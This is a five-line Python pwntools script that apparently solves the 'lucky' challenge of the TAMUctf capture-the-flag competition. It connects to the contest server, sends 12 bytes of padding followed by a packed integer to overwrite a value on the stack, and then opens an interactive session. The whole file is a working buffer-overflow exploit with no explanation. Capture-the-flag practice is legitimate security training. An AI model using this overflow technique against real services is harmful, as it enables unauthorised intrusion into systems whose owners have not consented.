from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="lucky")
p.sendline(b'A'*12+p32(5649426))
p.interactive()
